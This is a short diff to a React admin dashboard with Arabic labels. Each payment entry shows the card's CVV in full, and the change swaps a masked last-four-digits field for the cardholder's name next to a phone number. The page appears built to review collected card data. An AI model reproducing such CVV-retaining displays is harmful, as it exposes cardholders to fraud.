@@ -771,12 +771,12 @@ export default function AdminDashboard() {
                               <p className="font-mono font-bold text-red-600">{payment.cvv || '—'}</p>
                             </div>
                             <div className="bg-purple-50 rounded-lg p-3">
-                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
-                              <p className="font-mono">📱 {payment.phoneNumber || '—'}</p>
+                              <p className="text-gray-600 text-xs mb-1">اسم حامل البطاقة:</p>
+                              <p className="font-semibold text-gray-900">{payment.cardHolderName || '—'}</p>
                             </div>
                             <div className="bg-purple-50 rounded-lg p-3">
-                              <p className="text-gray-600 text-xs mb-1">آخر 4 أرقام:</p>
-                              <p className="font-mono font-bold">**** {payment.cardLastDigits || payment.cardNumber?.slice(-4) || '—'}</p>
+                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
+                              <p className="font-mono">📱 {payment.phoneNumber || '—'}</p>
                             </div>
                           </div>
                         )}
@@ -805,10 +805,6 @@ export default function AdminDashboard() {
                             <div className="bg-purple-50 rounded-lg p-3">
                               <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
                               <p className="font-mono font-bold text-purple-600">📱 {payment.phoneNumber || payment.phone || '—'}</p>
-                            </div>
-                            <div className="bg-purple-50 rounded-lg p-3">
-                              <p className="text-gray-600 text-xs mb-1">آخر 4 أرقام:</p>
-                              <p className="font-mono font-bold">**** {payment.cardLastDigits || payment.cardNumber?.slice(-4) || '—'}</p>
                             </div>
                           </div>
                         )}
